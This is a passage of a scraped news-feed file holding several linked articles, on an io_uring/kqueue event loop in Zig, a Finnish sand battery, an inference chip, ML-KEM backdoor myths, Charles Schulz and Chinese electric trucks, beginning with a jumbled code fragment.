         fn wrapper(ctx: ?*anyopaque, comp: *Completion, res: *const anyopaque) void {
             
                 callback(@intToPtr(Context, @ptrToInt(ctx)),
                     ,
                     comp@intToPtr(*const SendError!usize, @ptrToInt(res)).*,
                     
                 );
             }.wrapper,
         }.operation = .{
         .send = .{
             .socket = socket,
                 .buffer = buffer,
                 ,
             },
         }
     };// Fill out a submission immediately if possible, otherwise adds to overflow buffer
     self.enqueue(completion);
      }&lt;/code&gt;
    &lt;p&gt;Similarly, take a look at &lt;code&gt;flush&lt;/code&gt; on Linux
and macOS
for event processing. Look at &lt;code&gt;run_for_ns&lt;/code&gt; on Linux
and macOS
for the public API users must call. And finally, look at what puts this
all into practice, the loop calling &lt;code&gt;run_for_ns&lt;/code&gt; in
src/main.zig.&lt;/p&gt;
    &lt;p&gt;Weâve come this far and you might be wondering â what about cross-platform support for Windows? The good news is that Windows also has a completion based system similar to io_uring but without batching, called IOCP. And for bonus points, TigerBeetle provides the same I/O abstraction over it! But itâs enough to cover just Linux and macOS in this post. :)&lt;/p&gt;
    &lt;p&gt;In both this blog post and in TigerBeetle, we implemented a single-threaded event loop. Keeping I/O code single-threaded in userspace is beneficial (whether or not I/O processing is single-threaded in the kernel is not our concern). Itâs the simplest code and best for workloads that are not embarrassingly parallel. It is also best for determinism, which is integral to the design of TigerBeetle because it enables us to do Deterministic Simulation Testing&lt;/p&gt;
    &lt;p&gt;But there are other valid architectures for other workloads.&lt;/p&gt;
    &lt;p&gt;For workloads that are embarrassingly parallel, like many web servers, you could instead use multiple threads where each thread has its own queue. In optimal conditions, this architecture has the highest I/O throughput possible.&lt;/p&gt;
    &lt;p&gt;But if each thread has its own queue, individual threads can become starved if an uneven amount of work is scheduled on one thread. In the case of dynamic amounts of work, the better architecture would be to have a single queue but multiple worker threads doing the work made available on the queue.&lt;/p&gt;
    &lt;p&gt;Hey, maybe weâll split this out so you can use it too. Itâs written in Zig so we can easily expose a C API. Any language with a C foreign function interface (i.e. every language) should work well with it. Keep an eye on our GitHub. :)&lt;/p&gt;
    &lt;p&gt;Additional resources:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://tigerbeetle.com/blog/2022-11-23-a-friendly-abstraction-over-iouring-and-kqueue/"/><published>2025-11-27T22:41:06+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46073855</id><title>250MWh 'Sand Battery' to start construction in Finland</title><updated>2025-11-28T08:15:29.488862+00:00</updated><content>&lt;doc fingerprint="b76f0758cbd3b7b"&gt;
  &lt;main&gt;
    &lt;p&gt;Technology provider Polar Night Energy and utility Lahti Energia have partnered for a large-scale project using Polar’s ‘Sand Battery’ technology for the latter’s district heating network in Vääksy, Finland.&lt;/p&gt;
    &lt;p&gt;The project will have a heating power of 2MW and a thermal energy storage (TES) capacity of 250MW, making it a 125-hour system and the largest sand-based TES project once complete.&lt;/p&gt;
    &lt;p&gt;It will supply heat to Lahti Energia’s Vääksy district heating network but is also large enough to participate in Fingrid’s reserve and grid balancing markets.&lt;/p&gt;
    &lt;p&gt;Polar Night Energy’s technology works by heating a sand or a similar solid material using electricity, retaining that heat and then discharging that for industrial or heating use.&lt;/p&gt;
    &lt;head rend="h2"&gt;Try Premium for just $1&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Full premium access for the first month at only $1&lt;/item&gt;
      &lt;item&gt;Converts to an annual rate after 30 days unless cancelled&lt;/item&gt;
      &lt;item&gt;Cancel anytime during the trial period&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Premium Benefits&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Expert industry analysis and interviews&lt;/item&gt;
      &lt;item&gt;Digital access to PV Tech Power journal&lt;/item&gt;
      &lt;item&gt;Exclusive event discounts&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Or get the full Premium subscription right away&lt;/head&gt;
    &lt;head rend="h3"&gt;Or continue reading this article for free&lt;/head&gt;
    &lt;p&gt;The project will cut fossil-based emissions in the Vääksy district heating network by around 60% each year, by reducing natural gas use bu 80% and also decreasing wood chip consumption.&lt;/p&gt;
    &lt;p&gt;It follows Polar Night Energy completing and putting a 1MW/100MWh Sand Battery TES project into commercial operations this summer, for another utility Loviisan Lämpö. That project uses soapstone as its storage medium, a byproduct of ceramics production.&lt;/p&gt;
    &lt;p&gt;This latest project will use locally available natural sand, held in a container 14m high and 15m wide. Lahti Energia received a grant for the project from state body Business Finland.&lt;/p&gt;
    &lt;p&gt;Polar Night Energy will act as the main contractor for the construction project, with on-site work beginning in early 2026, and the Sand Battery will be completed in summer 2027.&lt;/p&gt;
    &lt;p&gt;“We want to offer our customers affordable district heating and make use of renewable energy in our heat production. The scale of this Sand Battery also enables us to participate in Fingrid’s reserve and grid balancing markets. As the share of weather-dependent energy grows in the grid, the Sand Battery will contribute to balancing electricity supply and demand”, says Jouni Haikarainen, CEO of Lahti Energia.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.energy-storage.news/250mwh-sand-battery-to-start-construction-in-finland-for-both-heating-and-ancillary-services/"/><published>2025-11-27T22:48:44+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46074111</id><title>Vsora Jotunn-8 5nm European inference chip</title><updated>2025-11-28T08:15:28.642493+00:00</updated><content>&lt;doc fingerprint="a495c47b155c4c8f"&gt;
  &lt;main&gt;
    &lt;p&gt;In modern data centers, success means deploying trained models with blistering speed, minimal cost, and effortless scalability. Designing and operating inference systems requires balancing key factors such as high throughput, low latency, optimized power consumption, and sustainable infrastructure. Achieving optimal performance while maintaining cost and energy efficiency is critical to meeting the growing demand for large-scale, real-time AI services across a variety of applications.&lt;/p&gt;
    &lt;p&gt;Unlock the full potential of your AI investments with our high-performance inference solutions. Engineered for speed, efficiency, and scalability, our platform ensures your AI models deliver maximum impact—at lower operational costs and with a commitment to sustainability. Whether you’re scaling up deployments or optimizing existing infrastructure, we provide the technology and expertise to help you stay competitive and drive business growth.&lt;/p&gt;
    &lt;p&gt;This is not just faster inference. It’s a new foundation for AI at scale.&lt;/p&gt;
    &lt;p&gt;In the world of AI data centers, speed, efficiency, and scale aren’t optional—they’re everything. Jotunn8, our ultra-high-performance inference chip is built to deploy trained models with lightning-fast throughput, minimal cost, and maximum scalability. Designed around what matters most—performance, cost-efficiency, and sustainability—they deliver the power to run AI at scale, without compromise!&lt;/p&gt;
    &lt;p&gt;Why it matters: Critical for real-time applications like chatbots, fraud detection, and search.&lt;/p&gt;
    &lt;p&gt;Reasoning models, Generative AI and Agentic AI are increasingly being combined to build more capable and reliable systems. Generative AI provide flexibility and language fluency. Reasoning models provide rigor and correctness. Agentic frameworks provide autonomy and decision-making. The VSORA architecture enables smooth and easy integration of these algorithms, providing near-theory performance.&lt;/p&gt;
    &lt;p&gt;Why it matters: AI inference is often run at massive scale – reducing cost per inference is essential for business viability.&lt;/p&gt;
    &lt;p&gt;Unmatched Performance at the Edge with Edge AI.&lt;/p&gt;
    &lt;p&gt;Fully programmable&lt;/p&gt;
    &lt;p&gt;Algorithm agnostic&lt;/p&gt;
    &lt;p&gt;Host processor agnostic&lt;/p&gt;
    &lt;p&gt;RISC-V core to offload &amp;amp; run AI completely on-chip&lt;/p&gt;
    &lt;p&gt;Tyr 4&lt;lb/&gt;fp8: 1600 Tflops&lt;lb/&gt;fp16: 400 Tflops&lt;/p&gt;
    &lt;p&gt;Tyr 2&lt;lb/&gt;fp8: 800 Tflops&lt;lb/&gt;fp16: 200 Tflops&lt;/p&gt;
    &lt;p&gt;Tyr 4&lt;lb/&gt;fp8/int8: 50 Tflops&lt;lb/&gt;fp16/int16: 25 Tflops&lt;lb/&gt;fp32/int32: 12 Tflops&lt;/p&gt;
    &lt;p&gt;Tyr 2&lt;lb/&gt;fp8/int8: 25 Tflops&lt;lb/&gt;fp16/int16: 12 Tflops&lt;lb/&gt;fp32/int32: 6 Tflops&lt;/p&gt;
    &lt;p&gt;Close to theory efficiency&lt;/p&gt;
    &lt;p&gt;Fully programmable&lt;/p&gt;
    &lt;p&gt;Algorithm agnostic&lt;/p&gt;
    &lt;p&gt;Host processor agnostic&lt;/p&gt;
    &lt;p&gt;RISC-V cores to offload host &lt;lb/&gt;&amp;amp; run AI completely on-chip.&lt;/p&gt;
    &lt;p&gt;fp8: 3200 Tflops&lt;lb/&gt;fp16: 800 Tflops &lt;/p&gt;
    &lt;p&gt;fp8/int8: 100 Tflops&lt;lb/&gt;fp16/int16: 50 Tflops&lt;lb/&gt;fp32/int32: 25 Tflops&lt;lb/&gt;Close to theory efficiency&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://vsora.com/products/jotunn-8/"/><published>2025-11-27T23:30:11+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46074183</id><title>ML-KEM Mythbusting</title><updated>2025-11-28T08:15:28.521505+00:00</updated><content>&lt;doc fingerprint="f6901077390420dd"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;What is this?&lt;/head&gt;
    &lt;p&gt;There have been some recent concerns about ML-KEM, NIST’s standard for encryption with Post-Quantum Cryptography, related standards of the IETF, and lots of conspiracy theories about malicious actors subverting the standardization process. As someone who has been involved with this standardization process at pretty much every level, here a quick debunking of the various nonsense I have heard. So let’s get started, FAQ style.&lt;/p&gt;
    &lt;head rend="h2"&gt;Did the NSA invent ML-KEM?&lt;/head&gt;
    &lt;p&gt;No. It was first specified by a team of various European cryptographers, whom you can look up on their website.&lt;/p&gt;
    &lt;head rend="h2"&gt;Okay, but that was Kyber, not ML-KEM, did the NSA change Kyber?&lt;/head&gt;
    &lt;p&gt;No. The differences between Kyber and ML-KEM are pretty minute, mostly editorial changes by NIST. The only change that could be seen as actually interesting was a slight change to how certain key derivation mechanics worked. This change was suggested by Peter Schwabe, one of the original authors of Kyber, and is fairly straightforward to analyze. The reason for this change was that originally, Kyber was able to produce shared secrets of any length, by including a KDF step. But applications usually need their own KDF to apply to shared secrets, in order to bind the shared secret to transcripts and similar, so you would end up with two KDF calls. Since Kyber only uses the KDF to stretch the output, removing it slightly improves the performance of the algorithm without having any security consequences. Basically, there was a feature that turned out to not actually be a feature in real world scenarios, so NIST removed it, after careful consideration, and after being encouraged to do so by the literal author of the scheme, and under the watchful eyes of the entire cryptographic community. Nothing untoward happened here.&lt;/p&gt;
    &lt;head rend="h2"&gt;Okay but what about maybe there still being a backdoor?&lt;/head&gt;
    &lt;p&gt;There is no backdoor in ML-KEM, and I can prove it. For something to be a backdoor, specifically a “Nobody but us backdoor” (NOBUS), you need some way to ensure that nobody else can exploit it, otherwise it is not a backdoor, but a broken algorithm, and any internal cryptanalysis you might have will be caught up eventually by academia. So for something to be a useful backdoor, you need to possess some secret that cannot be brute forced that acts as a private key to unlock any ciphertext generated by the algorithm. This is the backdoor in DUAL_EC_DRBG, and, since the US plans to use ML-KEM themselves (as opposed to the export cipher shenanigans back in the day), would be the only backdoor they could reasonably insert into a standard.&lt;/p&gt;
    &lt;p&gt;However, if you have a private key, that cannot be brute forced, you need to have a public key as well, and that public key needs to be large enough to prevent brute-forcing, and be embedded into the algorithm, as a parameter. And in order to not be brute forceable, this public key needs to have at least 128 bits of entropy. This gives us a nice test to see whether a scheme is capable of having cryptographic NOBUS backdoors: We tally up the entropy of the parameter space. If the result is definitely less than 128 bits, the scheme can at most be broken, but cannot be backdoored.&lt;/p&gt;
    &lt;p&gt;So let’s do that for ML-KEM:&lt;/p&gt;
    &lt;p&gt;This is the set of parameters, let’s tally them up, with complete disregard for any of the choices being much more constrained than random integers would suggest (actually, I am too much of a nerd to not point out the constraints, but I will use the larger number for the tally).&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Degree of the number field: 8 bits (actually, it has to be a power of two, so really only 3 bits)&lt;/item&gt;
      &lt;item&gt;Prime: 12 bits (actually, it has to be a prime, so 10.2 bits (Actually, actually, it has to be a prime of the form , and it has to be at least double the rank times degree, and 3329 is literally the smallest prime that fits that bill))&lt;/item&gt;
      &lt;item&gt;Rank of the module: 3 bits (well, the rank of the module is the main security parameter, it literally just counts from 2 to 4)&lt;/item&gt;
      &lt;item&gt;Secret and error term bounds: 2 + 2 bits (really these come from the size of the prime, the module rank, and the number field degree)&lt;/item&gt;
      &lt;item&gt;Compression strength: 4 + 3 bits&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;In total, this gives us 34 bits. Counted exceedingly generously. I even gave an extra bit for all the small numbers! Any asymmetric cryptosystem with a 34 bit public key would be brute forceable by a laptop within a few minutes, and ML-KEM would not be backdoored, but rather be broken. There is no backdoor in ML-KEM, because there simply is no space to hide a backdoor in ML-KEM.&lt;/p&gt;
    &lt;p&gt;And just to be sure, if you apply this same counting bits of parameters test to the famously backdoored DUAL_EC_DRBG, you indeed have multiple elliptic curve points defined in the standard without any motivation, immediately blowing our 128 bits of entropy budget for parameters. In fact, it would be trivial to fix DUAL_EC_DRBG by applying what’s called a “Nothing up my sleeves” paradigm: Instead of just having the elliptic curves points sit there, with no explanation, make it so that they are derived from digits of π, e, or the output of some hash function on some published seed. That would still not pass our test, but that is because I designed this test to be way too aggressive, as the remarks in the brackets show, there is not really any real choice to these parameters, they are just the smallest set of parameters that result in a secure scheme (making them larger would only make the scheme slower and/or have more overhead).&lt;/p&gt;
    &lt;p&gt;So no, there is no backdoor in ML-KEM.&lt;/p&gt;
    &lt;head rend="h2"&gt;But didn’t NIST fail basic math when picking ML-KEM?&lt;/head&gt;
    &lt;p&gt;No. In fact, I wrote an entire blog post about that topic, but “no” is an accurate summary of that post.&lt;/p&gt;
    &lt;head rend="h2"&gt;I thought ML-KEM was broken, something about a fault attack?&lt;/head&gt;
    &lt;p&gt;There are indeed fault attacks on ML-KEM. This is not super surprising, if you know what a fault attack (also called glitch attack) is. For a fault attack, you need to insert a mistake – a fault – in the computation of the algorithm. You can do this via messing with the physical hardware, things like ROWHAMMER that literally change the memory while the computation is happening. It’s important to analyze these types of failures, but literally any practical cryptographic algorithm in existence is vulnerable to fault attacks.&lt;/p&gt;
    &lt;p&gt;It’s literally computers failing at their one job and not computing very well. CPU and memory attacks are probably one of the most powerful families of attacks we have, and they have proven to be very stubborn to mitigate. But algorithms failing in the face of them is not particularly surprising, after all, if you can flip a single arbitrary bit, you might as well just set “verified_success” to true and call it a day. Technically, this is the strongest form of fault, where the attacker choses where it occurs, but even random faults usually demolish pretty much any cryptographic algorithm, and us knowing about these attacks is merely evidence of an algorithm being seen as important enough to do the math of how exactly they fail when you literally pull the ground out beneath them.&lt;/p&gt;
    &lt;head rend="h2"&gt;But what about decryption failure attacks? Those sound scary!&lt;/head&gt;
    &lt;p&gt;ML-KEM has a weird quirk: It is, theoretically, possible to create a ciphertext, in an honest fashion, that the private key holder will reject. If one were to successfully do so, one would learn information about the private key. But here comes the kicker: The only way to create this poisoned ciphertext is by honestly running the encapsulation algorithm, and hoping to get lucky. There is a slight way to bias the ciphertexts, but to do so, one still has to compute them, and the advantage would be abysmal, since ML-KEM forces the hand of the encapsulating party on almost all choices. The probability of this decapsulation failure can be compute with relatively straight-forward mathematics, the Cauchy-Schwartz inequality. And well, the parameters of ML-KEM are chosen in such a way that the actual probability is vanishingly small, less than . At this point, the attacker cannot really assume that they were observing a decapsulation failure anymore, as a whole range of other incredibly unlikely events, such as enough simultaneous bit flips due to cosmic radiation to evade error detection are far more likely. It is true that after the first decapsulation failure has been observed, the attacker has much more abilities to stack the deck in their favor, but to do so, you first need the first failure to occur, and there is not really any hope in doing so.&lt;/p&gt;
    &lt;p&gt;On top of this, the average ML-KEM key is used exactly once, as such is the fate of keys used in key exchange, further making any adaptive attack like this meaningless, but ML-KEM keys are safe to use even with multiple decapsulations.&lt;/p&gt;
    &lt;head rend="h2"&gt;But wasn’t there something called Kyberslash?&lt;/head&gt;
    &lt;p&gt;Yeah. It turns out, implementing cryptographic code is still hard. My modest bragging right is that my implementation, which would eventually morph into BoringSSL’s ML-KEM implementation, never had this problem, so I guess the answer here is to git gud, or something. But really, especially initially, there are some rough edges in new implementations as we learn the right techniques to avoid them. Importantly, this is a flaw of the implementation, not of the mathematics of the algorithm. In fact, the good news here is that implementationwise, ML-KEM is actually a lot simpler than elliptic curves are, so these kinds of minor side channel issues are likely to be rarer here, we just haven’t implemented it as much as elliptic curves.&lt;/p&gt;
    &lt;head rend="h2"&gt;Okay, enough about ML-KEM, what about hybrids and the IETF?&lt;/head&gt;
    &lt;p&gt;Okay, this one is a funny one. Well funny if you likely deeply dysfunctional bikeshedding, willful misunderstanding, and drama. First of, what are hybrids? Assume you have two cryptographic schemes that do the same thing, and you distrust both of them. But you do trust the combination of the two. That is, in essence, what hybrids allow you to do: Combine two schemes of the same type into one, so that the combined scheme is at least as secure as either of them. The usual line is that this is perfect for PQC, as it allows you to combine the well studied security of classical schemes with the quantum resistance of PQC schemes. Additionally, the overhead of elliptic curve cryptography, when compared with lattice cryptography, is tiny, so why not throw it in there. And generally I agree with that stance, although I would say that my trust in lattice cryptography is pretty much equal to my trust in elliptic curves, and quite a bit higher than my trust in RSA, so I would not see hybrids as absolutely, always and at every turn, superduper essential. But they are basically free, so why not? In the end, yes, hybrids are the best way to go, and indeed, this is what the IETF enabled people to do. There are various RFCs to that extent, to understand the current controversy, we need to focus on two TLS related ones: X25519MLKEM768 aka 0x11EC, and MLKEM1024. The former is a hybrid, the latter is not. And, much in line with my reasoning, 0x11EC is the default key exchange algorithm used by Chrome, Firefox, and pretty much all other TLS clients that currently support PQC. So what’s the point of MLKEM1024? Well it turns out there is one customer who really really hates hybrids, and only wants to use ML-KEM1024 for all their systems. And that customer happens to be the NSA. And honestly, I do not see a problem with that. If the NSA wants to make their own systems inefficient, then that is their choice. Why inefficient? It turns out that, due to the quirks of how TLS works, the client needs to predict what the server will likely accept. They could predict more things, but since PQC keys are quite chonky, sending more than one PQC key is making your handshakes slower. And so does mispredicting, since it results in the server saying “try again, with the right public key, this time”. So, if everyone but the NSA uses X25519MLKEM768, the main effect is that the NSA has slower handshakes. As said, I don’t think it’s reasonable to say their handshakes are substantially less secure, but sure, if you really think ML-KEM is broken, then yes, the NSA has successfully undermined the IETF in order to make their own systems less secure, while not impacting anyone else. Congratulations to them, I guess.&lt;/p&gt;
    &lt;head rend="h2"&gt;But doesn’t the IETF actively discourage hybrids?&lt;/head&gt;
    &lt;p&gt;No. To understand this, we need to look at two flags that come with TLS keyexchange algorithms: Recommended and Mandatory To Implement. Recommended is a flag with three values, Yes, No, and Discouraged. The Discouraged state is used for algorithms known to be broken, such as RC4. Clearly ML-KEM, with or without a hybrid, is not known to be broken, so Discouraged is the wrong category. It is true that 0x11EC is not marked as Recommended, mostly because it started out as an experimental combination that then somehow ended up as the thing everybody was doing, and while lots of digital ink was spilled on whether or not it should be recommended, nobody updated the flag before publishing the RFC. (technically the RFC is not published yet, but the rest is pretty much formality, and the flag is unlikely to change) So yes, technically the IETF did not recommend a hybrid algorithm. But your browsers and everybody else is using it, so there is that. And just in case you were worried about that, the NSA option of MLKEM1024 is also not marked as recommended.&lt;/p&gt;
    &lt;p&gt;Lastly, Mandatory To Implement is an elaborate prank by the inventors of TLS to create more discussions on mailing lists. As David Benjamin once put it, the only algorithm that is actually mandatory to implement is the null algorithm, as that is the name of the initial state of a TLS connection, before an algorithm has been negotiated. Otherwise, at least my recommendation, is to respond with this gif&lt;/p&gt;
    &lt;p&gt;whenever someone requests a MTI algorithm you don’t want to support. The flag has literally zero meaning. Oh and yeah, neither of the two algorithms is MTI.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://keymaterial.net/2025/11/27/ml-kem-mythbusting/"/><published>2025-11-27T23:42:00+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46074286</id><title>Bird flu viruses are resistant to fever, making them a major threat to humans</title><updated>2025-11-28T08:15:28.404828+00:00</updated><content/><link href="https://medicalxpress.com/news/2025-11-bird-flu-viruses-resistant-fever.html"/><published>2025-11-27T23:57:57+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46074362</id><title>How Charles M Schulz created Charlie Brown and Snoopy (2024)</title><updated>2025-11-28T08:15:28.038414+00:00</updated><content>&lt;doc fingerprint="2e364174bde00afd"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;'You have to just draw something that you hope is funny': How Charles M Schulz created Charlie Brown and Snoopy&lt;/head&gt;
    &lt;p&gt;Charles M Schulz drew his beloved Peanuts strip for 50 years until his announcement on 14 December 1999 that ill health was forcing him to retire. In History looks at how an unassuming cartoonist built a billion-dollar empire out of the lives of a group of children, a dog and a bird.&lt;/p&gt;
    &lt;p&gt;Charles M Schulz's timeless creation Charlie Brown may have been as popular as any character in all of literature, but the cartoonist was modest about the scope of his miniature parables. In a 1977 BBC interview, he said: "I'm talking only about the minor everyday problems in life. Leo Tolstoy dealt with the major problems of the world. I'm only dealing with why we all have the feeling that people don't like us."&lt;/p&gt;
    &lt;p&gt;This did not mean that he felt as if he was dealing with trivial matters. He said: "I'm always very much offended when someone asks me, 'Do I ever do satire on the social condition?' Well, I do it almost every day. And they say, 'Well, do you ever do political things?' I say, 'I do things which are more important than politics. I'm dealing with love and hate and mistrust and fear and insecurity.'"&lt;/p&gt;
    &lt;p&gt;While Charlie Brown may have been the eternal failure, the universal feelings that Schulz channelled helped make Peanuts a global success. Born in 1922, Schulz drew every single Peanuts strip himself from 1950 until his death in February 2000. It was so popular that Nasa named two of the modules in its May 1969 Apollo 10 lunar mission after Charlie Brown and Snoopy. The strip was syndicated in more than 2,600 newspapers worldwide, and inspired films, music and countless items of merchandise.&lt;/p&gt;
    &lt;p&gt;Part of its success, according to the writer Umberto Eco, was that it worked on different levels. He wrote: "Peanuts charms both sophisticated adults and children with equal intensity, as if each reader found there something for himself, and it is always the same thing, to be enjoyed in two different keys. Peanuts is thus a little human comedy for the innocent reader and for the sophisticated."&lt;/p&gt;
    &lt;p&gt;Schulz's initial reason for focusing on children in the strip was strictly commercial. In 1990, he told the BBC: "I always hate to say it, but I drew little kids because this is what sold. I wanted to draw something, I didn't know what it was, but it just seemed as if whenever I drew children, these were the cartoons that editors seemed to like the best. And so, back in 1950, I mailed a batch of cartoons to New York City, to United Features Syndicate, and they said they liked them, and so ever since I've been drawing little kids."&lt;/p&gt;
    &lt;p&gt;IN HISTORY&lt;/p&gt;
    &lt;p&gt;In History is a series which uses the BBC's unique audio and video archive to explore historical events that still resonate today. Subscribe to the accompanying weekly newsletter.&lt;/p&gt;
    &lt;p&gt;Of Snoopy and Charlie Brown, he said: "I've always been a little bit intrigued by the fact that dogs apparently tolerate the actions of the children with whom they are playing. It's almost as if the dogs are smarter than the kids. I think also that the characters I have serve as a good outlet for any idea that I may come up with. I never think of an idea and then find that I have no way of using it. I can use any idea that I think of because I've got the right repertory company."&lt;/p&gt;
    &lt;p&gt;Schulz called upon some of his earliest experiences as a shy child to create the strip. As a teenager, he studied drawing by correspondence course because he was too reticent to attend art school in person. Speaking in 1977, he said: "I couldn't see myself sitting in a room where everyone else in the room could draw much better than I, and this way I was protected by drawing at home and simply mailing my drawings in and having them criticised. I wish I had a better education, but I think that my entire background made me well suited for what I do.&lt;/p&gt;
    &lt;p&gt;"If I could write better than I can, perhaps I would have tried to become a novelist, and I might have become a failure. If I could draw better than I can, I might have tried to become an illustrator or an artist and would have failed there, but my entire being seems to be just right for being a cartoonist."&lt;/p&gt;
    &lt;head rend="h2"&gt;Never give up&lt;/head&gt;
    &lt;p&gt;Peanuts remained remarkably consistent despite the relentless publishing schedule, and Schulz would not let the expectations of his millions of fans become a distraction. He said: "You have to kind of bend over the drawing board, shut the world out and just draw something that you hope is funny. Cartooning is still drawing funny pictures, whether they're just silly little things or rather meaningful political cartoons, but it's still drawing something funny, and that's all you should think about at that time – keep kind of a light feeling.&lt;/p&gt;
    &lt;p&gt;"I suppose when a composer is composing well, the music is coming faster than he can think of it, and when I have a good idea I can hardly get the words down fast enough. I'm afraid that they will leave me before I get them down on the paper. Sometimes my hand will literally shake with excitement as I'm drawing it because I'm having a good time. Unfortunately, this does not happen every day."&lt;/p&gt;
    &lt;p&gt;More like this:&lt;/p&gt;
    &lt;p&gt;• Julie Andrews on being 'teased' for Mary Poppins&lt;/p&gt;
    &lt;p&gt;Despite his modesty, Schulz insisted he was always confident that Peanuts would be a hit. He said: "I mean, when you sign up to play at Wimbledon, you expect to win. Obviously, there are a lot of things that I didn't anticipate, like Snoopy's going to the Moon and things like that, but I always had hopes it would become big."&lt;/p&gt;
    &lt;p&gt;Schulz generally worked five weeks in advance. On 14 December 1999, fans were dismayed to learn that he would be hanging up his pen because he had cancer. He said that his cartoon for 3 January 2000 would be the final daily release. It would be followed on 13 February with the final strip for a Sunday newspaper. He died one day before that last strip ran.&lt;/p&gt;
    &lt;p&gt;In it, Schulz wrote: "I have been grateful over the years for the loyalty of our editors and the wonderful support and love expressed to me by fans of the comic strip. Charlie Brown, Snoopy, Linus, Lucy... how can I ever forget them..."&lt;/p&gt;
    &lt;p&gt;Back in 1977, Schulz insisted that the cartoonist's role was mostly to point out problems rather than trying to solve them, but there was one lesson that people could take from his work. He said: "I suppose one of the solutions is, as Charlie Brown, just to keep on trying. He never gives up. And if anybody should give up, he should."&lt;/p&gt;
    &lt;p&gt;--&lt;/p&gt;
    &lt;p&gt;For more stories and never-before-published radio scripts to your inbox, sign up to the In History newsletter, while The Essential List delivers a handpicked selection of features and insights twice a week.&lt;/p&gt;
    &lt;p&gt;For more Culture stories from the BBC, follow us on Facebook, X and Instagram.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.bbc.com/culture/article/20241205-how-charles-m-schulz-created-charlie-brown-and-snoopy"/><published>2025-11-28T00:10:38+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46075305</id><title>China's BEV trucks and the end of diesel's dominance</title><updated>2025-11-28T08:15:27.814538+00:00</updated><content>&lt;doc fingerprint="aafc0042e1d89de8"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;China’s BEV Trucks and the End of Diesel’s Dominance&lt;/head&gt;
    &lt;p&gt;Support CleanTechnica's work through a Substack subscription or on Stripe.&lt;/p&gt;
    &lt;p&gt;Cheap Chinese battery electric heavy trucks are no longer a rumor. They are real machines with real price tags that are so low that they force a reassessment of what the global freight industry is willing to pay for electrification. Standing in a commercial vehicle hall in Wuhan and seeing a 400 kWh or 600 kWh truck priced between €58,000 and €85,000, as my European freight trucking electrification contact Johnny Nijenhuis recently did, changes the frame of the entire conversation. These are not diesel frames with a battery box welded underneath. They are purpose built electric trucks built around LFP packs, integrated e-axles and the simplified chassis architecture that becomes possible when the engine bay, gearbox, diesel tank, emissions controls and half of the mechanical complexity of a truck disappear. Anyone who has worked with heavy vehicles knows the cost structure of diesel powertrains. Removing that entire system while building at very large scale produces numbers that do not match Western experience.&lt;/p&gt;
    &lt;p&gt;China’s low price electric trucks do not arrive as finished products for Europe or North America. They need work. Western short haul freight fleets expect certain features that Chinese domestic buyers usually skip. Tires need to carry E-mark or FMVSS certification. Electronic stability controls must meet UNECE R13 or FMVSS 121. Cab structures need to meet R29 or similar requirements. Crash protection for battery packs needs to satisfy R100 or FMVSS 305. European drivers expect better seats, quieter cabs and stronger HVAC. Even in short haul work, fleets expect well understood advanced driver assistance (ADAS) features to handle traffic and depot work. However, inexpensive Chinese leaf springs are just fine for short haul trucking given the serious upgrade to driver comfort and truck performance of battery electric drivetrains.&lt;/p&gt;
    &lt;p&gt;When these adjustments are added into the bill of materials and spread across a production run, the upgrades land in the €20,000 to €40,000 range for short haul duty, per my rough estimate. That moves the landed price up to roughly €80,000 to €120,000. The comparison with Western OEM offerings is stark because Western battery electric trucks today often start near €250,000 and can move far higher once options and charging hardware are included. A short haul operator looking at the difference between a €100,000 truck and a €300,000 truck will ask which one meets the actual duty cycle. For operators with depot charging and predictable delivery routes, the cheaper truck is credible in a way that few expected even three years ago.&lt;/p&gt;
    &lt;p&gt;The long haul story is different. European and North American long haul operators require far more from a truck than a Chinese domestic short range tractor offers. Axle loads need to support 40 to 44 ton gross combined weight. Suspension needs to manage high speed stability for many hours a day on roads built for 80 to 100 km/h cruising. Cab structures must handle fatigue and cross winds on long corridors. Drivers spend nights sleeping in the cab and expect western comfort standards. Trailer interfaces require specific electrical and pneumatic systems that have to meet long established norms. Battery safety systems need to be built for high speed impacts and rollover events. All of that requires a larger budget. The gap between a domestic Chinese tractor and a European or North American long haul tractor is roughly €80,000 to €120,000 once all mechanical, safety and comfort systems are brought to the required levels per my estimate. That does not erase the cost advantage, because even a €180,000 Chinese based long haul electric truck is cheaper than many Western models, but it does shift the choice from simple purchase price to service expectations and lifetime durability.&lt;/p&gt;
    &lt;p&gt;Most freight is not long haul. French and German economic councils have both looked at freight movements through national data and concluded that the majority of truck trips and ton kilometers occur in short haul service. This includes urban deliveries, regional distribution, logistics shuttles between depots and ports, construction supply and waste collection. These trips are usually under 250 km, begin and end at the same depot and involve repeated stop-start movement where electric drivetrains perform well. The idea that the heavy trucking problem is a long haul problem has shaped Western investment priorities for a decade, but national economic councils in Europe now argue that solving short haul electrification first delivers most of the benefit. The fact that low cost Chinese battery electric trucks map almost perfectly onto these duty cycles suggests that they will find receptive markets once import pathways are established.&lt;/p&gt;
